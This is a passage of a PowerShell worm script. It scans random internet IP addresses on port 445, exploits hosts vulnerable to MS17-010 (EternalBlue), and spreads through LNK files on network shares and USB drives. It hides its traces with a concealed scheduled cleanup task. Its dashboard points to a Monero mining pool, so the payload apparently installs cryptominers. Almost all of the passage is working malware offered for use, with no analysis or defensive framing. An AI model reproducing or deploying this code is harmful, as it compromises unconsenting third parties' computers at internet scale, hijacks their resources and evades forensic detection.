  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"$cleanupPath"</Arguments></Exec></Actions>
</Task>
"@
        $xp = "$env:TEMP\so_clean.xml"
        [System.IO.File]::WriteAllText($xp, $cleanupXml, [System.Text.Encoding]::Unicode)
        schtasks /Create /TN "MF-Cleanup" /XML $xp /F 2>$null | Out-Null
        Remove-Item $xp -Force -ErrorAction SilentlyContinue
        WLog "Cleanup executed and scheduled"
    }
    
    function Test-Gov {
        try { $exp = [datetime]::Parse($expiry); if ((Get-Date) -gt $exp) { WLog "Worm expired"; return $false } } catch {}
        $cnt = 0
        try { if (Test-Path "$base\infection_count.txt") { $cnt = [int](Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}
        if ($cnt -ge $max) { WLog "Cap reached: $cnt/$max"; return $false }
        return $true
    }
    
    function Update-Count {
        try {
            $cnt = 0
            if (Test-Path "$base\infection_count.txt") { $cnt = [int](Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }
            $cnt++
            Set-Content -Path "$base\infection_count.txt" -Value $cnt -Force -ErrorAction SilentlyContinue
            WLog "Infection count: $cnt/$max"
            Update-Status "infected" $cnt
        } catch {}
    }
    
    # ---- WORM MAIN ----
    WLog "============================================"
    WLog "WORM MODULE STARTING (background) - INTERNET WIDE"
    WLog "Max targets: $max"
    WLog "Expiry: $expiry"
    WLog "EB Exploit: $ebReady"
    WLog "============================================"
    
    if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }
    
    $batchNum = 0
    while ((Test-Gov)) {
        $batchNum++
        Update-Status "last_action" "Scanning batch $batchNum (500 IPs)"
        WLog "Phase 1: Internet-wide random IP discovery - Batch $batchNum (port 445)"
        
        $smbHosts = Scan-SMBHosts -Count 500
        
        $scanned = 0
        try { $scanned = (Get-Content $statusFile -Raw | ConvertFrom-Json).scanned } catch {}
        $scanned += 500
        Update-Status "scanned" $scanned
        Update-Status "open_445" ($scanned + $smbHosts.Count) # rough tracking
        
        WLog "SMB hosts found: $($smbHosts.Count)"

        if ($smbHosts.Count -eq 0) {
            WLog "No hosts in batch $batchNum. Waiting 15s..."
            Update-Status "last_action" "No hosts found, waiting 15s..."
            Start-Sleep -Seconds 15
            continue
        }

        WLog "Phase 2: Exploitation (parallel)"
        $infected = 0
        $failedHosts = @()
        
        foreach ($ip in $smbHosts) {
            if (-not (Test-Gov)) { break }
            Update-Status "last_ip" $ip
            Update-Status "last_action" "Testing $ip for MS17-010..."
            WLog "Testing $ip for MS17-010..."
            if (Test-EBVuln -ip $ip) {
                $vulnCount = 0
                try { $vulnCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).vulnerable } catch {}
                $vulnCount++
                Update-Status "vulnerable" $vulnCount

                WLog "$ip vulnerable to MS17-010"
                Update-Status "last_action" "Exploiting $ip..."
                $success = Invoke-EBExploit -ip $ip
                if ($success) { $infected++; Update-Count; WLog "Infected $ip (Total: $infected)" }
                else { 
                    WLog "Exploitation failed on $ip"; $failedHosts += $ip
                    $failCount = 0
                    try { $failCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).failed } catch {}
                    $failCount++
                    Update-Status "failed" $failCount
                }
            } else { WLog "$ip not vulnerable to MS17-010 (patched)" }
            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
        }
        
        if ((Test-Gov) -eq $false) { break }
    }
    
    Update-Status "last_action" "Exploitation phase complete"
    WLog "Phase 3: Network share contamination"
    $shares = Get-Shares
    WLog "Shares found: $($shares.Count)"
    
    foreach ($share in $shares) {
        if (-not (Test-Gov)) { break }
        if (Drop-LNK -sharePath $share) { Update-Count; WLog "LNK dropped on $share" }
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    }
    
    WLog "Phase 4: USB spread"
    Start-USB
    
    WLog "Phase 5: Forensic cleanup"
    Invoke-Cleanup
    
    Update-Status "last_action" "WORM SWEEP COMPLETE"
    WLog "============================================"
    WLog "WORM SWEEP COMPLETE"
    WLog "USB watcher: Active"
    WLog "Cleanup: Complete"
    WLog "============================================"
    
} -ArgumentList $BASE, $PAYLOAD_URL, $MAX_TARGETS, $WORM_EXPIRY, $ebExe, $ebReady, $STATUS_FILE | Out-Null

# ---- LIVE DASHBOARD ----
Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host "    WORM MODULE ACTIVE (INTERNET-WIDE)" -ForegroundColor Magenta
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host "  Max Targets:  $MAX_TARGETS" -ForegroundColor White
Write-Host "  Expiry:       $WORM_EXPIRY" -ForegroundColor White
Write-Host "  EB Exploit:   $(if ($ebReady) { 'Ready (inline compiled)' } else { 'Fallback (WMI/SCM/Task)' })" -ForegroundColor White
Write-Host "  Payload URL:  GitHub (alphahubv2/alpha-v2)" -ForegroundColor White
Write-Host "  Log:          $WORM_LOG" -ForegroundColor White
Write-Host "  Cap Counter:  $BASE\infection_count.txt" -ForegroundColor White
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "  LIVE STATUS DASHBOARD:" -ForegroundColor Yellow
Write-Host "  Run this in another terminal to watch live progress:" -ForegroundColor Gray
Write-Host ""
Write-Host '    while ($true) { Clear-Host; $s = Get-Content "C:\ProgramData\MF\status.json" -Raw | ConvertFrom-Json; Write-Host "  WORM LIVE STATUS - $(Get-Date -Format "HH:mm:ss")" -ForegroundColor Cyan; Write-Host "  =================================" -ForegroundColor Cyan; Write-Host "  IPs Scanned:   $($s.scanned)" -ForegroundColor White; Write-Host "  Port 445 Open: $($s.open_445)" -ForegroundColor Green; Write-Host "  Vulnerable:    $($s.vulnerable)" -ForegroundColor Yellow; Write-Host "  INFECTED:      $($s.infected) / 50" -ForegroundColor Magenta; Write-Host "  Failed:        $($s.failed)" -ForegroundColor Red; Write-Host "  Last IP:       $($s.last_ip)" -ForegroundColor Gray; Write-Host "  Action:        $($s.last_action)" -ForegroundColor Gray; Write-Host "  =================================" -ForegroundColor Cyan; Start-Sleep 2 }'
Write-Host ""
Write-Host "  Or check MoneroOcean dashboard for live miner count:"
Write-Host "  https://moneroocean.stream" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host ""
